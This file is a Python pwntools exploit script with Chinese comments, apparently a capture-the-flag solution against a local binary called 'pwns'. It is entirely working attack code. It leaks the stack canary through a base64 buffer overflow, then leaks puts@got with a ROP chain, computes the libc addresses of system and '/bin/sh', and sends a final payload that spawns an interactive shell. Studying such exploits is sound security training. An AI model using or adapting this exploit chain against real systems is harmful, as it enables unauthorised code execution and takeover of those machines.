#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
import struct
import base64

#context.log_level = 'debug'

LIB = '/lib/i386-linux-gnu/libc.so.6'
EXE = './pwns'

lib = ELF(LIB)
exe = ELF(EXE)

OFFSET = 257  # 存储base64结果的栈变量长度为257
CANARY_OFFSET = 12  # canary cookie 在 ebp - 12 处

#io = process(EXE)
io = remote('127.0.0.1', 4444)

# 获取 canary cookie
print
log.info('**** to get canary cookie ****')
payload = cyclic(OFFSET + 1)   # 因为 canary cookie 第一位是00，为了让 printf 能打印出后面的数据，必须也填充掉
b64payload = base64.b64encode(payload)

io.sendlineafter('[Y/N]\n', 'Y')
io.sendlineafter('datas:\n\n', b64payload)
out = io.recvuntil('[Y/N]\n')

n = len('Result is:')
offset = n + OFFSET + 1
canary_p32 = '\x00' + out[offset : offset + 3]  # 取 payload 之后的三个字符，并在最高位复原\x00
canary, = struct.unpack('<I', canary_p32)  # 转为整数数值
log.success('canary = {}'.format(hex(canary)))

# 栈溢出获取 puts@got 地址
print 
log.info('**** to stackoverflow to get puts@got and count system@got & "/bin/sh" ****')

payload = cyclic(OFFSET) + canary_p32 + cyclic(CANARY_OFFSET) + p32(exe.symbols['puts']) + p32(0x808487e6) + p32(exe.got['puts'])
b64payload = base64.b64encode(payload)

io.sendline('Y')
io.sendlineafter('datas:\n\n', b64payload)
out = io.recvuntil('[Y/N]\n')

puts_got_p32 = out.split('\n')[1][:4]
puts_got, = struct.unpack('<I', puts_got_p32)
log.success('puts@got = {}'.format(hex(puts_got)))

# 计算 system@got 地址
system_got = lib.symbols['system'] - lib.symbols['puts'] + puts_got
binsh = lib.search('/bin/sh').next() - lib.symbols['puts'] + puts_got
log.success('system@got = {}, "/bin/sh" = {}'.format(hex(system_got), hex(binsh)))

# 运行 system("/bin/sh") 获取shell
print
log.info('**** to stackoverflow to run system("/bin/sh") to get sehll ****')
payload = cyclic(OFFSET) + canary_p32 + cyclic(CANARY_OFFSET) + p32(system_got) + p32(0xdeadbeef) + p32(binsh)
b64payload = base64.b64encode(payload)

io.sendline('Y')
io.sendlineafter('datas:\n\n', b64payload)

io.interactive()
